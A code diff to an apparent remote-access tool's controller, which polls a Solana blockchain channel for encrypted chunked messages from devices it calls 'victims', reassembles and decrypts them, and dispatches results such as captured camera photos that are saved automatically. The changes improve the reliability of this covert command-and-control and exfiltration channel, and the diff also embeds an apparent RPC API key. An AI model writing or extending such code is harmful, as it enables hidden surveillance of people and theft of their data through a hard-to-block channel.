@@ -980,6 +980,156 @@ const MIN_POLL_INTERVAL = 15000; // Minimum 15 seconds between polls
 let blockchainListenerStartTime = 0; // When listener started - ignore old transactions
 let pollCycleCount = 0;
 
+// Helper function to check and complete any pending chunk assemblies
+function checkPendingChunkAssemblies(config, sendBlockchainLog) {
+  if (blockchainChunkBuffers.size === 0) {
+    return; // No pending transfers
+  }
+  
+  const now = Date.now();
+  const MAX_TRANSFER_AGE = 15 * 60 * 1000; // 15 minutes - clean up old incomplete transfers (increased for large transfers)
+  const STALE_THRESHOLD = 10 * 60 * 1000; // 10 minutes - mark as stale if no progress (increased for large transfers)
+  
+  log.info(`[Blockchain] Periodic check: ${blockchainChunkBuffers.size} pending chunk transfer(s)`);
+  
+  // First pass: clean up old/stale transfers
+  const toDelete = [];
+  for (const [chunkId, entry] of blockchainChunkBuffers.entries()) {
+    const age = now - entry.startTime;
+    const lastUpdate = entry.lastUpdateTime || entry.startTime;
+    const timeSinceLastUpdate = now - lastUpdate;
+    const actualReceived = entry.parts.filter(p => p !== null).length;
+    
+    // Delete if transfer is too old (10 minutes)
+    if (age > MAX_TRANSFER_AGE) {
+      log.warn(`[Blockchain] Cleaning up old transfer ${chunkId} (${(age / 1000).toFixed(0)}s old, ${actualReceived}/${entry.total} chunks)`);
+      console.log(`[Blockchain] ✗ Removing stale transfer: ${chunkId} (${actualReceived}/${entry.total} chunks, ${(age / 1000).toFixed(0)}s old)`);
+      toDelete.push(chunkId);
+      continue;
+    }
+    
+    // Delete if no progress for threshold and incomplete
+    // BUT: If we're very close (missing <= 3 chunks), be more patient (use longer threshold)
+    const missing = entry.total - actualReceived;
+    const effectiveStaleThreshold = (missing > 0 && missing <= 3) ? (STALE_THRESHOLD * 2) : STALE_THRESHOLD; // 20 minutes if missing <= 3 chunks
+    
+    if (actualReceived < entry.total && timeSinceLastUpdate > effectiveStaleThreshold) {
+      // If we're missing just 1-3 chunks, log more details before cleanup
+      if (missing <= 3) {
+        const missingChunks = [];
+        for (let i = 0; i < entry.total; i++) {
+          if (entry.parts[i] === null) missingChunks.push(i + 1);
+        }
+        log.warn(`[Blockchain] Cleaning up stale transfer ${chunkId} (no progress for ${(timeSinceLastUpdate / 1000).toFixed(0)}s, ${actualReceived}/${entry.total} chunks, missing: ${missingChunks.join(', ')})`);
+        console.log(`[Blockchain] ✗ Removing stale transfer: ${chunkId} (missing chunks: ${missingChunks.join(', ')}, no progress for ${(timeSinceLastUpdate / 1000).toFixed(0)}s)`);
+      } else {
+        log.warn(`[Blockchain] Cleaning up stale transfer ${chunkId} (no progress for ${(timeSinceLastUpdate / 1000).toFixed(0)}s, ${actualReceived}/${entry.total} chunks)`);
+        console.log(`[Blockchain] ✗ Removing stale transfer: ${chunkId} (no progress for ${(timeSinceLastUpdate / 1000).toFixed(0)}s)`);
+      }
+      toDelete.push(chunkId);
+      continue;
+    }
+  }
+  
+  // Delete stale transfers
+  for (const chunkId of toDelete) {
+    blockchainChunkBuffers.delete(chunkId);
+  }
+  
+  if (toDelete.length > 0) {
+    log.info(`[Blockchain] Cleaned up ${toDelete.length} stale transfer(s)`);
+    sendBlockchainLog(`[ℹ] Cleaned up ${toDelete.length} stale transfer(s)`);
+  }
+  
+  // Second pass: check remaining transfers
+  for (const [chunkId, entry] of blockchainChunkBuffers.entries()) {
+    const actualReceived = entry.parts.filter(p => p !== null).length;
+    const elapsed = ((Date.now() - entry.startTime) / 1000).toFixed(1);
+    
+    // Log progress for incomplete transfers
+    if (actualReceived < entry.total) {
+      const percent = Math.round((actualReceived / entry.total) * 100);
+      const missing = entry.total - actualReceived;
+      log.info(`[Blockchain] Periodic check: ${chunkId} - ${actualReceived}/${entry.total} chunks (${percent}%) - ${missing} missing - ${elapsed}s elapsed`);
+      console.log(`[Blockchain] Periodic check: ${chunkId} - ${actualReceived}/${entry.total} chunks (${percent}%) - ${missing} missing`);
+      
+      // If we're missing chunks and it's been a while, log which chunks are missing
+      // Also trigger a more aggressive search for missing chunks
+      if (missing > 0 && elapsed > 60) {
+        const missingChunks = [];
+        for (let i = 0; i < entry.total; i++) {
+          if (entry.parts[i] === null) missingChunks.push(i + 1);
+        }
+        if (missingChunks.length > 0 && missingChunks.length <= 20) {
+          log.warn(`[Blockchain] Missing chunks for ${chunkId}: ${missingChunks.join(', ')}`);
+          console.log(`[Blockchain] Missing chunks: ${missingChunks.join(', ')}`);
+          
+          // If we're very close (missing < 5 chunks), log more aggressively
+          if (missingChunks.length <= 5) {
+            log.info(`[Blockchain] Very close to completion - missing only ${missingChunks.length} chunk(s): ${missingChunks.join(', ')}`);
+            sendBlockchainLog(`[⚠] Missing ${missingChunks.length} chunk(s): ${missingChunks.join(', ')}`);
+          }
+        }
+      }
+    }
+    
+    if (actualReceived === entry.total) {
+      // All chunks received - assemble now
+      log.info(`[Blockchain] Periodic check: All ${entry.total} chunks ready for ${chunkId} - assembling...`);
+      console.log(`[Blockchain] Periodic check: Assembling ${chunkId} (${entry.total} chunks)`);
+      
+      // Verify all parts are present
+      let allPartsPresent = true;
+      const missingParts = [];
+      for (let i = 0; i < entry.total; i++) {
+        if (entry.parts[i] === null) {
+          allPartsPresent = false;
+          missingParts.push(i + 1);
+        }
+      }
+      
+      if (!allPartsPresent) {
+        log.warn(`[Blockchain] Cannot assemble ${chunkId} - missing chunks: ${missingParts.join(', ')} (have ${actualReceived}/${entry.total})`);
+        console.error(`[Blockchain] ✗ Cannot assemble ${chunkId} - missing chunks: ${missingParts.join(', ')}`);
+        continue;
+      }
+      
+      const assembled = entry.parts.join('');
+      blockchainChunkBuffers.delete(chunkId);
+      const finalElapsed = ((Date.now() - entry.startTime) / 1000).toFixed(1);
+      log.success(`[Blockchain] ✓ All ${entry.total} chunks assembled for ${chunkId} (${finalElapsed}s)`);
+      sendBlockchainLog(`[✓] All ${entry.total} chunks assembled for ${chunkId} (${finalElapsed}s)`);
+      console.log(`[Blockchain] ✓ All ${entry.total} chunks assembled for ${chunkId} - assembling response...`);
+      
+      const decrypted = decryptMemoPayloadMain(assembled, config.aesKey);
+      if (decrypted) {
+        let isPhoto = false;
+        try {
+          const preview = JSON.parse(decrypted);
+          if (preview.event === 'x0000ca' || (preview.data && preview.data.image)) {
+            isPhoto = true;
+            log.success(`[Blockchain] Photo response received - ${entry.total} chunks assembled (${elapsed}s)`);
+            sendBlockchainLog(`[✓] Photo response received - ${entry.total} chunks assembled (${elapsed}s)`);
+            console.log(`[Blockchain] Photo response detected - will be saved automatically`);
+          }
+        } catch (e) {
+          // Not JSON, continue
+        }
+        processBlockchainResponse(decrypted, 'periodic-check', sendBlockchainLog);
+        
+        if (isPhoto) {
+          log.info(`[Blockchain] Photo will be saved automatically when processed by camera handler`);
+          console.log(`[Blockchain] Photo will be saved to Downloads folder when camera handler processes it`);
+        }
+      } else {
+        log.error(`[Blockchain] Failed to decrypt assembled chunks for ${chunkId}`);
+        sendBlockchainLog(`[✗] Failed to decrypt assembled chunks`);
+        console.error(`[Blockchain] ✗ Failed to decrypt assembled chunks for ${chunkId}`);
+      }
+    }
+  }
+}
+
 async function pollBlockchainForClients(config) {
   if (!ConnectionMain || !PublicKeyMain || !config.channelAddress || !config.aesKey) {
     log.warn('[Blockchain] Poll skipped - missing dependencies or config');
@@ -1008,7 +1158,7 @@ async function pollBlockchainForClients(config) {
     'https://api.devnet.solana.com',
     'https://api.testnet.solana.com',
     'https://rpc.ankr.com/solana_devnet',
-    'https://devnet.helius-rpc.com/?api-key=1587a8d0-6581-451d-93a8-4221147748d3'
+    'https://devnet.helius-rpc.com/?api-key=288d548c-1be7-4db4-86c3-60300d282efa'
   ].filter(Boolean).filter(url => !url.includes('alchemy') && !url.includes('ankr.com')); // Filter out demo keys and unstable ones
   
   // Rotate RPCs - skip rate-limited ones
@@ -1043,7 +1193,30 @@ async function pollBlockchainForClients(config) {
     const connection = new ConnectionMain(rpc, 'confirmed');
     const channelPubkey = new PublicKeyMain(config.channelAddress);
     
-    const sigInfos = await connection.getSignaturesForAddress(channelPubkey, { limit: 20 }, 'confirmed');
+    // Increase limit significantly to catch all chunks for large chunked transfers
+    // For 233 chunks, we need to check at least 233 transactions, so use 300+ to be safe
+    // Also check if we have pending transfers that need more chunks - increase limit dynamically
+    let transactionLimit = 200;
+    let needsAggressiveSearch = false;
+    if (blockchainChunkBuffers.size > 0) {
+      // If we have pending transfers, check more transactions to find missing chunks
+      const maxChunksNeeded = Math.max(...Array.from(blockchainChunkBuffers.values()).map(e => e.total));
+      // Use 1.5x the number of chunks to ensure we catch all transactions
+      transactionLimit = Math.max(300, Math.ceil(maxChunksNeeded * 1.5));
+      if (transactionLimit > 500) transactionLimit = 500; // Cap at 500 to avoid overwhelming RPC
+      
+      // Check if we're very close to completion (missing < 5 chunks) - use even higher limit
+      for (const [chunkId, entry] of blockchainChunkBuffers.entries()) {
+        const missing = entry.total - entry.parts.filter(p => p !== null).length;
+        if (missing > 0 && missing <= 5) {
+          needsAggressiveSearch = true;
+          // For very close transfers, check even more transactions
+          transactionLimit = Math.max(transactionLimit, 400);
+          log.info(`[Blockchain] Very close to completion (missing ${missing} chunks) - using aggressive search with limit ${transactionLimit}`);
+        }
+      }
+    }
+    const sigInfos = await connection.getSignaturesForAddress(channelPubkey, { limit: transactionLimit }, 'confirmed');
     
     // Clear rate limit on success
     if (rpcRateLimitMap.has(rpc)) {
@@ -1053,15 +1226,44 @@ async function pollBlockchainForClients(config) {
     // Count how many are new (not skipped)
     let newTxCount = 0;
     let skippedOldCount = 0;
+    // Check if we need to look for specific missing chunks
+    let missingChunksToFind = new Map(); // chunkId -> Set of missing chunk numbers
+    if (blockchainChunkBuffers.size > 0) {
+      for (const [chunkId, entry] of blockchainChunkBuffers.entries()) {
+        const missing = entry.total - entry.parts.filter(p => p !== null).length;
+        if (missing > 0 && missing <= 10) {
+          // We're close - track which specific chunks are missing
+          const missingSet = new Set();
+          for (let i = 0; i < entry.total; i++) {
+            if (entry.parts[i] === null) {
+              missingSet.add(i + 1); // Chunk numbers are 1-indexed
+            }
+          }
+          if (missingSet.size > 0) {
+            missingChunksToFind.set(chunkId, missingSet);
+            log.info(`[Blockchain] Looking for missing chunks for ${chunkId}: ${Array.from(missingSet).join(', ')}`);
+          }
+        }
+      }
+    }
+    
     for (const info of sigInfos) {
       if (!info || !info.signature) continue;
       if (blockchainSeenSignatures.has(info.signature)) continue;
       if (info.blockTime && blockchainListenerStartTime > 0) {
         const txTimeMs = info.blockTime * 1000;
-        // 5 minute grace period
+        // 5 minute grace period (but we'll check more transactions if we have missing chunks)
         if (txTimeMs < (blockchainListenerStartTime - 300000)) {
-          skippedOldCount++;
-          continue;
+          // If we're looking for specific missing chunks, be more lenient with time window
+          if (missingChunksToFind.size === 0) {
+            skippedOldCount++;
+            continue;
+          }
+          // For missing chunks, extend time window to 20 minutes
+          if (txTimeMs < (blockchainListenerStartTime - 1200000)) {
+            skippedOldCount++;
+            continue;
+          }
         }
       }
       newTxCount++;
@@ -1080,25 +1282,41 @@ async function pollBlockchainForClients(config) {
     
     for (const info of sigInfos) {
       if (!info || !info.signature) continue;
-      if (blockchainSeenSignatures.has(info.signature)) continue;
-      blockchainSeenSignatures.add(info.signature);
+      
+      // If we're looking for specific missing chunks, re-check even seen signatures
+      // (in case we missed processing a chunk earlier)
+      const isSeen = blockchainSeenSignatures.has(info.signature);
+      if (isSeen && missingChunksToFind.size === 0) {
+        continue; // Skip already seen transactions unless we're looking for missing chunks
+      }
+      
+      if (!isSeen) {
+        blockchainSeenSignatures.add(info.signature);
+      }
       
       // Skip transactions that are older than when we started listening
       // (blockTime is in seconds, we use milliseconds)
-      // BUT: Be more generous with the time window (5 minutes) to catch INIT messages
-      // that might have been sent just before the server started listening
+      // BUT: Be very generous with the time window (20 minutes) to catch:
+      // - INIT messages from clients that started first
+      // - Chunked transfers that may have started before listener was active
+      // - Large chunked transfers (like 233 chunks) that span longer time periods
+      // - Missing chunks that were sent earlier in the transfer sequence
       if (info.blockTime && blockchainListenerStartTime > 0) {
         const txTimeMs = info.blockTime * 1000;
-        // Allow 5 minutes grace period for INIT messages from clients that started first
-        if (txTimeMs < (blockchainListenerStartTime - 300000)) {
-          continue; // Skip old transaction (more than 5 minutes before listener start)
+        // Allow 20 minutes grace period for large chunked transfers
+        // If we're looking for specific missing chunks, extend to 30 minutes
+        const timeWindow = missingChunksToFind.size > 0 ? 1800000 : 1200000; // 30 min vs 20 min
+        if (txTimeMs < (blockchainListenerStartTime - timeWindow)) {
+          continue; // Skip old transaction
         }
       }
       
-      // Limit seen signatures set size
-      if (blockchainSeenSignatures.size > 1000) {
+      // Limit seen signatures set size - increase to handle more chunks
+      // For 146 chunks, we need at least 146 seen signatures, so keep more
+      if (blockchainSeenSignatures.size > 2000) {
         const arr = Array.from(blockchainSeenSignatures);
-        blockchainSeenSignatures = new Set(arr.slice(-500));
+        // Keep last 1000 to ensure we don't lose track of recent chunks
+        blockchainSeenSignatures = new Set(arr.slice(-1000));
       }
       
       try {
@@ -1180,31 +1398,204 @@ async function pollBlockchainForClients(config) {
               const total = parseInt(match[3], 10);
               const chunkHex = match[4];
               
+              // Log chunk reception with order info
+              log.info(`[Blockchain] Chunk ${part}/${total} received (id: ${chunkId}, order: ${part})`);
               sendBlockchainLog(`[⬇] Chunk ${part}/${total} received (id: ${chunkId})`);
               
               let entry = blockchainChunkBuffers.get(chunkId);
+              const isFirstChunk = !entry;
               if (!entry) {
-                entry = { total, parts: new Array(total).fill(null), received: 0 };
+                entry = { 
+                  total, 
+                  parts: new Array(total).fill(null), 
+                  received: 0, 
+                  startTime: Date.now(),
+                  lastUpdateTime: Date.now() // Track when transfer started
+                };
+                log.info(`[Blockchain] Starting chunked transfer: ${chunkId} (${total} chunks total)`);
+                sendBlockchainLog(`[ℹ] Starting chunked transfer: ${chunkId} (${total} chunks)`);
+                
+                // Clean up very old incomplete transfers when starting a new one (keep only recent ones)
+                const now = Date.now();
+                const MAX_AGE = 15 * 60 * 1000; // 15 minutes
+                for (const [oldChunkId, oldEntry] of blockchainChunkBuffers.entries()) {
+                  if (oldChunkId !== chunkId && (now - oldEntry.startTime) > MAX_AGE) {
+                    const oldReceived = oldEntry.parts.filter(p => p !== null).length;
+                    if (oldReceived < oldEntry.total) {
+                      log.info(`[Blockchain] Cleaning up old incomplete transfer ${oldChunkId} (${oldReceived}/${oldEntry.total} chunks)`);
+                      blockchainChunkBuffers.delete(oldChunkId);
+                    }
+                  }
+                }
               }
               
-              if (!entry.parts[part - 1]) {
+              // Store chunk if not already received
+              const wasNewChunk = !entry.parts[part - 1];
+              if (wasNewChunk) {
                 entry.parts[part - 1] = chunkHex;
-                entry.received += 1;
+                entry.lastUpdateTime = Date.now(); // Track when we last received a chunk
+              } else {
+                // Duplicate chunk received - log for debugging
+                log.warn(`[Blockchain] Duplicate chunk ${part}/${total} received for ${chunkId} - ignoring`);
               }
+              // Always recalculate received count from actual non-null parts (handles out-of-order chunks)
+              entry.received = entry.parts.filter(p => p !== null).length;
               blockchainChunkBuffers.set(chunkId, entry);
               
+              // If we're looking for this specific chunk and found it, log success
+              if (missingChunksToFind.has(chunkId)) {
+                const missingSet = missingChunksToFind.get(chunkId);
+                if (missingSet.has(part)) {
+                  log.success(`[Blockchain] ✓ Found missing chunk ${part}/${total} for ${chunkId}!`);
+                  sendBlockchainLog(`[✓] Found missing chunk ${part}/${total} for ${chunkId}`);
+                  missingSet.delete(part);
+                  if (missingSet.size === 0) {
+                    missingChunksToFind.delete(chunkId);
+                  }
+                }
+              }
+              
+              // Debug: Log chunk storage details
+              if (part === total || entry.received === entry.total) {
+                const missing = [];
+                for (let i = 0; i < entry.total; i++) {
+                  if (entry.parts[i] === null) missing.push(i + 1);
+                }
+                if (missing.length > 0 && missing.length <= 10) {
+                  log.info(`[Blockchain] Missing chunks for ${chunkId}: ${missing.join(', ')} (have ${entry.received}/${entry.total})`);
+                }
+              }
+              
+              // Log progress every 10 chunks or when complete
+              if (entry.received % 10 === 0 || entry.received === entry.total) {
+                const percent = Math.round((entry.received / entry.total) * 100);
+                log.info(`[Blockchain] Chunk progress: ${entry.received}/${entry.total} (${percent}%) for ${chunkId}`);
+                sendBlockchainLog(`[⬇] Progress: ${entry.received}/${entry.total} chunks (${percent}%)`);
+              }
+              
+              // Debug: Log when we receive the last chunk
+              if (part === total) {
+                log.info(`[Blockchain] Last chunk ${part}/${total} received for ${chunkId} - checking assembly...`);
+                console.log(`[Blockchain] Last chunk ${part}/${total} received - have ${entry.received}/${entry.total} total chunks`);
+              }
+              
+              // Immediately check if we have all chunks (do this check right after updating)
+              const checkReceived = entry.parts.filter(p => p !== null).length;
+              if (checkReceived === entry.total) {
+                log.info(`[Blockchain] All ${entry.total} chunks received for ${chunkId} - triggering assembly check`);
+                console.log(`[Blockchain] ✓ All ${entry.total} chunks received - will assemble now`);
+                
+                // Trigger immediate assembly check
+                checkPendingChunkAssemblies(config, sendBlockchainLog);
+              }
+              
+              // Notify LabCtrl to reset timeout whenever a chunk is received
+              // This ensures timeout is extended as chunks continue to arrive
+              if (win && win.webContents) {
+                win.webContents.send('Blockchain:ChunkReceived', {
+                  chunkId: chunkId,
+                  part: part,
+                  total: total,
+                  received: entry.received
+                });
+              }
+
+              // Also notify all lab windows so they can show progress and reset timeouts
+              for (const victimId in windows) {
+                try {
+                  const labWindow = BrowserWindow.fromId(windows[victimId]);
+                  if (labWindow && !labWindow.isDestroyed()) {
+                    labWindow.webContents.send('Blockchain:ChunkReceived', {
+                      chunkId: chunkId,
+                      part: part,
+                      total: total,
+                      received: entry.received
+                    });
+                  }
+                } catch (e) {
+                  // Ignore errors for individual lab windows
+                }
+              }
+
+              if (isFirstChunk) {
+                sendBlockchainLog(`[ℹ] First chunk ${part}/${total} received - resetting timeout`);
+              }
+              
               // If all chunks received, assemble and process
-              if (entry.received === entry.total) {
+              // Double-check by counting non-null parts to ensure accuracy
+              const actualReceived = entry.parts.filter(p => p !== null).length;
+              
+              // Debug logging when close to completion
+              if (actualReceived >= entry.total - 2 && actualReceived < entry.total) {
+                log.info(`[Blockchain] Almost complete: ${actualReceived}/${entry.total} chunks for ${chunkId} (missing ${entry.total - actualReceived})`);
+                console.log(`[Blockchain] Almost complete: ${actualReceived}/${entry.total} - checking for missing chunks...`);
+              }
+              
+              if (actualReceived === entry.total) {
+                // Verify all parts are present before assembling
+                let allPartsPresent = true;
+                const missingParts = [];
+                for (let i = 0; i < entry.total; i++) {
+                  if (entry.parts[i] === null) {
+                    allPartsPresent = false;
+                    missingParts.push(i + 1);
+                  }
+                }
+                
+                if (!allPartsPresent) {
+                  log.warn(`[Blockchain] Cannot assemble ${chunkId} - missing chunks: ${missingParts.join(', ')} (have ${actualReceived}/${entry.total})`);
+                  console.error(`[Blockchain] ✗ Cannot assemble - missing chunks: ${missingParts.join(', ')}`);
+                  return; // Don't process incomplete assembly
+                }
+                
+                log.info(`[Blockchain] All parts verified - proceeding with assembly for ${chunkId}`);
+                console.log(`[Blockchain] ✓ All ${entry.total} parts verified - assembling...`);
+                
                 const assembled = entry.parts.join('');
                 blockchainChunkBuffers.delete(chunkId);
-                sendBlockchainLog(`[✓] All ${total} chunks assembled for ${chunkId}`);
+                const elapsed = ((Date.now() - entry.startTime) / 1000).toFixed(1);
+                log.success(`[Blockchain] ✓ All ${total} chunks assembled for ${chunkId} (${elapsed}s)`);
+                sendBlockchainLog(`[✓] All ${total} chunks assembled for ${chunkId} (${elapsed}s)`);
+                console.log(`[Blockchain] ✓ All ${total} chunks assembled for ${chunkId} - assembling response...`);
                 
                 const decrypted = decryptMemoPayloadMain(assembled, config.aesKey);
                 if (decrypted) {
+                  // Try to detect if this is a photo response
+                  let isPhoto = false;
+                  try {
+                    const preview = JSON.parse(decrypted);
+                    if (preview.event === 'x0000ca' || (preview.data && preview.data.image)) {
+                      isPhoto = true;
+                      log.success(`[Blockchain] Photo response received - ${total} chunks assembled (${elapsed}s)`);
+                      sendBlockchainLog(`[✓] Photo response received - ${total} chunks assembled (${elapsed}s)`);
+                      console.log(`[Blockchain] Photo response detected - will be saved automatically`);
+                    }
+                  } catch (e) {
+                    // Not JSON, continue
+                  }
                   processBlockchainResponse(decrypted, info.signature, sendBlockchainLog);
+                  
+                  // Log photo info for debugging
+                  if (isPhoto) {
+                    log.info(`[Blockchain] Photo will be saved automatically when processed by camera handler`);
+                    console.log(`[Blockchain] Photo will be saved to Downloads folder when camera handler processes it`);
+                  }
+                } else {
+                  log.error(`[Blockchain] Failed to decrypt assembled chunks for ${chunkId}`);
+                  sendBlockchainLog(`[✗] Failed to decrypt assembled chunks`);
+                  console.error(`[Blockchain] ✗ Failed to decrypt assembled chunks for ${chunkId}`);
+                }
+              } else {
+                // Debug: Log when we're close but not complete
+                if (actualReceived >= entry.total - 3) {
+                  log.info(`[Blockchain] Close to completion: ${actualReceived}/${entry.total} chunks for ${chunkId} (missing ${entry.total - actualReceived})`);
+                  console.log(`[Blockchain] Close: ${actualReceived}/${entry.total} - missing ${entry.total - actualReceived} chunks`);
                 }
               }
             }
+            
+            // After processing chunk, check if any transfers are now complete
+            checkPendingChunkAssemblies(config, sendBlockchainLog);
             continue;
           }
           
@@ -1240,6 +1631,9 @@ async function pollBlockchainForClients(config) {
             }
           }
         }
+        
+        // After processing all memos from this transaction, check for completed assemblies
+        checkPendingChunkAssemblies(config, sendBlockchainLog);
       } catch (txErr) {
         // Transaction fetch error, continue
         log.warn(`[Blockchain] Error fetching tx ${info.signature.substring(0, 16)}: ${txErr.message}`);
@@ -1248,9 +1642,12 @@ async function pollBlockchainForClients(config) {
     }
     
     // Poll cycle complete
-    sendBlockchainLog(`[✓] Poll cycle complete`);
-    
-  } catch (rpcErr) {
+      sendBlockchainLog(`[✓] Poll cycle complete`);
+      
+      // Final check for any pending chunk assemblies that might be complete
+      checkPendingChunkAssemblies(config, sendBlockchainLog);
+      
+    } catch (rpcErr) {
     const errorMsg = rpcErr.message || String(rpcErr);
     const is429 = errorMsg.includes('429') || errorMsg.includes('Too Many Requests') || errorMsg.includes('rate limit');
     
@@ -1281,9 +1678,24 @@ function processBlockchainResponse(decrypted, signature, sendLog) {
     const eventName = parsed.event || 'unknown';
     // Data can be nested in parsed.data OR directly in parsed (for init/heartbeat)
     const data = parsed.data || parsed;
+    
+    // Log camera/image responses for debugging
+    if (eventName === 'x0000ca' && data && data.image) {
+      const bufferPreview = data.buffer ? (data.buffer.substring(0, 50) + '...') : 'no buffer';
+      log.info(`[Blockchain] Camera image response detected - buffer length: ${data.buffer ? data.buffer.length : 0}, preview: ${bufferPreview}`);
+      console.log(`[Blockchain] Camera image response - image: ${data.image}, buffer type: ${typeof data.buffer}, buffer length: ${data.buffer ? data.buffer.length : 0}`);
+    }
 
+    // Log decrypted response (truncate for logging, but keep full data)
     const trimmedDecrypted = decrypted.length > 400 ? `${decrypted.substring(0, 400)}...[truncated]` : decrypted;
     log.info(`[Blockchain] Decrypted response (${signature.substring(0, 16)}): ${trimmedDecrypted}`);
+    
+    // For image responses, log buffer length separately
+    if (eventName === 'x0000ca' && data && data.image && data.buffer) {
+      log.info(`[Blockchain] Image buffer length: ${data.buffer.length} chars`);
+      console.log(`[Blockchain] Image buffer: ${data.buffer.length} chars`);
+    }
+    
     sendLog(`[✓] Decrypted response: event=${eventName}`);
 
     // Extract client ID from the response
@@ -1329,29 +1741,95 @@ function processBlockchainResponse(decrypted, signature, sendLog) {
         const victim = victimsList.getVictim(clientId);
         const sock = victim && victim.socket;
         // instrumentation removed
-        if (sock && sock._listeners && sock._listeners.has(eventName)) {
-          const listeners = sock._listeners.get(eventName) || [];
-        // instrumentation removed
-          listeners.forEach((handler) => {
-            try {
-              // #region agent log
-              // instrumentation removed
-              // #endregion
-              // Clone data to prevent mutations between listeners
-              const clonedData = data && typeof data === 'object' ? JSON.parse(JSON.stringify(data)) : data;
-              handler(clonedData);
-              // #region agent log
-              // instrumentation removed
-              // #endregion
-            } catch (err) {
-              log.warn(`[Blockchain] Listener error for ${eventName}: ${err.message}`);
-              // #region agent log
-              // instrumentation removed
-              // #endregion
+        if (sock && sock._listeners) {
+          const hasListeners = sock._listeners.has(eventName);
+          const listenerCount = hasListeners ? (sock._listeners.get(eventName) || []).length : 0;
+          log.info(`[Blockchain] Dispatching ${eventName} to ${clientId.substring(0, 8)}... (hasListeners: ${hasListeners}, count: ${listenerCount})`);
+          
+          if (hasListeners) {
+            const listeners = sock._listeners.get(eventName) || [];
+            // instrumentation removed
+            listeners.forEach((handler) => {
+              try {
+                // #region agent log
+                // instrumentation removed
+                // #endregion
+                // Clone data to prevent mutations between listeners
+                // For large buffers (like images), preserve them properly
+                let clonedData;
+                if (data && typeof data === 'object') {
+                    // Check if this is an image response with a buffer
+                    if (data.image && data.buffer && typeof data.buffer === 'string') {
+                        // For image buffers (Base64 strings), clone manually to avoid JSON serialization issues
+                        // JSON.stringify can truncate or corrupt very large strings
+                        const bufferLength = data.buffer.length;
+                        clonedData = {
+                            image: data.image,
+                            buffer: data.buffer, // Preserve Base64 string directly (no JSON serialization)
+                            error: data.error,
+                            camList: data.camList,
+                            list: data.list,
+                            chunked: data.chunked,
+                            transferId: data.transferId
+                        };
+                        // Log buffer length for debugging
+                        log.info(`[Blockchain] Cloning image buffer: ${bufferLength} chars`);
+                        console.log(`[Blockchain] Image buffer length: ${bufferLength}, cloned length: ${clonedData.buffer.length}`);
+                        
+                        // Verify buffer wasn't truncated
+                        if (clonedData.buffer.length !== bufferLength) {
+                          log.error(`[Blockchain] ERROR: Buffer was truncated during clone! Original: ${bufferLength}, Cloned: ${clonedData.buffer.length}`);
+                          console.error(`[Blockchain] ✗ Buffer truncation detected!`);
+                        }
+                    } else {
+                        // For other data, use JSON clone
+                        clonedData = JSON.parse(JSON.stringify(data));
+                    }
+                } else {
+                    clonedData = data;
+                }
+                handler(clonedData);
+                log.info(`[Blockchain] Successfully called handler for ${eventName}`);
+                // #region agent log
+                // instrumentation removed
+                // #endregion
+              } catch (err) {
+                log.warn(`[Blockchain] Listener error for ${eventName}: ${err.message}`);
+                // #region agent log
+                // instrumentation removed
+                // #endregion
+              }
+            });
+          } else {
+            log.warn(`[Blockchain] No listeners registered for ${eventName} on client ${clientId.substring(0, 8)}...`);
+            // Try to find any blockchain client if clientId didn't match
+            if (!victim) {
+              const allVictims = victimsList.getAllVictims();
+              const blockchainClients = Object.entries(allVictims).filter(([id, v]) => {
+                return v && (v.isBlockchain || v.connectionType === 'blockchain') && v.isOnline;
+              });
+              if (blockchainClients.length > 0) {
+                const [fallbackId, fallbackVictim] = blockchainClients[0];
+                const fallbackSock = fallbackVictim && fallbackVictim.socket;
+                if (fallbackSock && fallbackSock._listeners && fallbackSock._listeners.has(eventName)) {
+                  log.info(`[Blockchain] Found fallback client ${fallbackId.substring(0, 8)}... with listeners for ${eventName}`);
+                  const listeners = fallbackSock._listeners.get(eventName) || [];
+                  const clonedData = data && typeof data === 'object' ? JSON.parse(JSON.stringify(data)) : data;
+                  listeners.forEach((handler) => {
+                    try {
+                      handler(clonedData);
+                      log.info(`[Blockchain] Successfully called fallback handler for ${eventName}`);
+                    } catch (err) {
+                      log.warn(`[Blockchain] Fallback listener error for ${eventName}: ${err.message}`);
+                    }
+                  });
+                }
+              }
             }
-          });
+            // instrumentation removed
+          }
         } else {
-          // instrumentation removed
+          log.warn(`[Blockchain] No socket found for client ${clientId.substring(0, 8)}...`);
         }
       } catch (err) {
         log.warn(`[Blockchain] Failed to dispatch ${eventName} to victim socket: ${err.message}`);
@@ -1809,6 +2287,24 @@ ipcMain.on('openLabWindow', function (e, page, index) {
 
 // ========== TEST SUITE IPC HANDLERS ==========
 let testSuiteProcess = null;
+
+// IPC handler for photo save logging
+ipcMain.on('log-photo-saved', (event, data) => {
+  if (data && data.filePath) {
+    log.success(`[Photo] Saved: ${data.filePath}`);
+    log.info(`[Photo] File: ${data.fileName}, Size: ${data.sizeMB} MB (${data.sizeBytes} bytes)`);
+    console.log(`[Photo] ✓ Photo saved to: ${data.filePath}`);
+    console.log(`[Photo]   File: ${data.fileName}, Size: ${data.sizeMB} MB`);
+  }
+});
+
+ipcMain.on('log-photo-error', (event, data) => {
+  if (data && data.error) {
+    log.error(`[Photo] Failed to save: ${data.path || 'unknown path'}`);
+    log.error(`[Photo] Error: ${data.error}`);
+    console.error(`[Photo] ✗ Failed to save photo: ${data.error}`);
+  }
+});
 
 ipcMain.on('test-suite:start', (event, config) => {
   log.info('Starting test suite with config:', JSON.stringify(config));
